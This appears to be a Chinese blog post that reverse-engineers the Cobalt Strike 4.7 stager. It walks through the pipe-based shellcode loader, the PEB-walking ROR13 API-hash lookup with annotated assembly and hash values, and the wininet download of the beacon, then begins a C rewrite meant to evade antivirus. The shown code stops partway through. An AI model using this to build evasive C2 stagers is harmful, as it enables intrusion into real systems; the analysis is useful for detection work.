## 1\. 概述
一直很想有一个自己的控，奈何实力不允许，CS 仍然是目前市面上最好用的控，但是也被各大厂商盯得很紧，通过加载器的方式进行免杀效果有限，后来看到有人用 go
重写了 CS 的 beacon，感觉这个思路很好，但是 go 编译的也有很多问题，加载起来会有很多受限的地方，所以想着能不能用 C 去重写一个，不过
beacon 的功能很多，短时间去重写有点费劲，所以想先重写 CS 的 stager 部分，并能转化成 shellcode 通过加载器进行加载。CS
4.7出来有段时间了，本文尝试对 CS 的 stager 进行逆向，并尝试用 C 重写 stager 的 shellcode 。
## 2\. 样本信息
样本名：artifact.exe （通过CS的Windows Stager Payload生成的64位exe）
## 3\. Stager 逆向
CS 生成的 exe 格式的 stager 本质上就是一个 shellcode 加载器，真正实现 stager 的拉取 beacon 功能的是其中的
shellcode 部分，因为加载器我们可以通过很多方式去实现，且4.7版本的 stager 加载流程并没有较大变化，所以对 stager
的加载部分只做简单的分析。
#### 3.1 Shellcode加载部分：
进入主函数，直接进 sub_4017F8 函数看它的功能实现：
进入 sub_4017F8 函数，先获取系统时间戳，然后创建线程通过管道读取 shellcode 并执行：
拼接的管道名：\\\\.\pipe\MSSE-3410-server：
跟进 CreateThread 中的线程执行函数：
跟进 WriteShellcodeToPipe_401630，创建管道并循环写入 shellcode：
shellcode 内容如下：
写入 shellcode：
跟进 ShellcodeExec_4017A6 函数，该函数实现从管道接收 shellcode 并解密执行：
从管道中读取 shellcode 到内存：
将读取到的 shellcode 在 DecryptAndExecShellcode_401595 函数中解密执行：
解密后的 shellcode 可以通过 CreateThread 的传参找到，起始地址保存在 R9 寄存器中：
#### 3.2 Shellcode执行部分：
Shellcode 是一段地址无关代码，不能直接调用 Win32Api，CS 的 shellcode 是通过遍历 PEB 结构和 PE
文件导出表并根据导出函数的 hash 值查找需要的模块和 API 函数：
##### 3.2.1 遍历PEB获取Win32API
遍历PEB：
计算模块哈希：
查找导出函数：
该部分的完整汇编如下：
    | mov rdx,qword ptr gs:[rdx+60]      | 查找PEB
    | mov rdx,qword ptr ds:[rdx+18]      | 查找LDR链表
    | mov rdx,qword ptr ds:[rdx+20]      | 访问InMemoryOrderModuleList链表
    | mov rsi,qword ptr ds:[rdx+50]      | 将模块名称存入rsi寄存器
    | movzx rcx,word ptr ds:[rdx+4A]     | 将模块名称长度存入rcx寄存器（unicode）
    | xor r9,r9                          | 
    | xor rax,rax                        |
    | lodsb                              | 逐字符读入模块名称
    | cmp al,61                          | 判断大小写
    | jl A0037                           | 大写则跳转
    | sub al,20                          | 如果是小写就转换为大写
    | ror r9d,D                          | ROR13加密计算
    | add r9d,eax                        | 将计算得到的hash值存入R9寄存器
    | loop A002D                         | 循环计算
    | push rdx                           |
    | push r9                            | 
    | mov rdx,qword ptr ds:[rdx+20]      | 找到模块基地址
    | mov eax,dword ptr ds:[rdx+3C]      | 找到0x3C偏移（PE标识）
    | add rax,rdx                        | rax指向PE标识
    | cmp word ptr ds:[rax+18],20B       | 判断OptionHeader结构的Magic为是否为20B（PE32+）
    | jne A00C7                          |
    | mov eax,dword ptr ds:[rax+88]      | 将导出表RVA赋值给eax寄存器
    | test rax,rax                       |
    | je A00C7                           |
    | add rax,rdx                        | 模块基址+导出表RVA=导出表VA
    | push rax                           |
    | mov ecx,dword ptr ds:[rax+18]      | 将导出函数的数量赋值给ecx寄存器
    | mov r8d,dword ptr ds:[rax+20]      | 将导出函数的起始RVA赋值给R8寄存器
    | add r8,rdx                         | 导出函数的起始VA
    | jrcxz A00C6                        |
    | dec rcx                            |
    | mov esi,dword ptr ds:[r8+rcx*4]    | 从后向前获取导出函数的RVA
    | add rsi,rdx                        | 当前导出函数的VA
    | xor r9,r9                          | 
    | xor rax,rax                        |
    | lodsb                              | 逐字符读入导出函数名
    | ror r9d,D                          | ROR13加密运算
    | add r9d,eax                        | 计算的hash存入R9
    | cmp al,ah                          | 字符串最后一位为0，此时al、ah均为0，循环结束
    | jne A007D                          | 不为0，继续运算
    | add r9,qword ptr ss:[rsp+8]        | 将模块hash与函数hash求和
    | cmp r9d,r10d                       | 运算结果与要查找的函数hash（R10）进行比较
    | jne A006E                          | 没找到则跳回去继续找
    | pop rax                            |
之后会不断循环上面的代码通过hash依次查找以下Api函数：
    0x0726774C => LoadLibraryA
    0xA779563A => InternetOpenA
    0xC69F8957 => InternetConnectA
    0x3B2E55EB => HttpOpenRequestA
    0x7B18062D => HttpSendRequestA
    0xE553A458 => VirtualAlloc
    0xE2899612 => InternetReadFile
##### 3.2.2 请求C2服务器建立连接
调用 LoadLibraryA 加载 wininet.dll：
调用 InternetOpenA 进行初始化：
调用 InternetConnectA 与控制端建立 http 会话：
调用 HttpOpenRequestA 创建 http 请求：
调用 HttpSendRequestA 将指定请求发送到服务器：
##### 3.2.3 获取Beacon加载上线
调用 VirtualAlloc 为 beacon 分配内存：
循环调用 InternetReadFile 将 beacon 读取到分配的内存：
跳转，进入 beacon 的内存空间：
之后，beacon 会解密自身，通过反射式DLL注入执行上线，不在本篇范围，故不赘述。
## 4\. C 重写 Shellcode
通过前面的内容我们已经了解了 CS 的 stager 的基本功能，其中 shellcode 部分通过调用 wininet.dll 中的相关 API 函数向
C2 服务器发起 http 请求并建立连接，远程读取 beacon 的内容并为其分配内存后跳转执行，在 C 里面，我们只需要调用相同的 API
函数即可实现相同的功能。
然而，我们的目的是希望用 C 编写出来的代码可以转化为 shellcode，这样既可以保留 shellcode 灵活加载的优势，也可以通过编写 C
代码自由地控制 shellcode（汇编大佬勿cue）。因为 shellcode 是一段地址无关代码，我们不能像编译一个可执行文件那样直接调用
Windows API，这就是为什么 CS 的 shellcode 会有一段代码通过遍历 PEB 和导出表来获取所需的 Windows API 函数。
理清了思路，剩下的就是写代码了，下面给出关键代码。
#### 4.1 Shellcode的代码实现
##### 4.1.1 遍历PEB获取Win32API
这个部分已经有很多代码实例了，直接拿来 include 就可以：
    #include 
    #include 
    // This compiles to a ROR instruction
    // This is needed because _lrotr() is an external reference
    // Also, there is not a consistent compiler intrinsic to accomplish this across all three platforms.
    #define ROTR32(value, shift) (((DWORD) value >> (BYTE) shift) | ((DWORD) value Ldr;
     pNextModule = pLdr->InLoadOrderModuleList.Flink;
     pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;
     while (pDataTableEntry->DllBase != NULL)
     {
      dwModuleHash = 0;
      pModuleBase = pDataTableEntry->DllBase;
      BaseDllName = pDataTableEntry->BaseDllName;
      pNTHeader = (PIMAGE_NT_HEADERS) ((ULONG_PTR) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)->e_lfanew);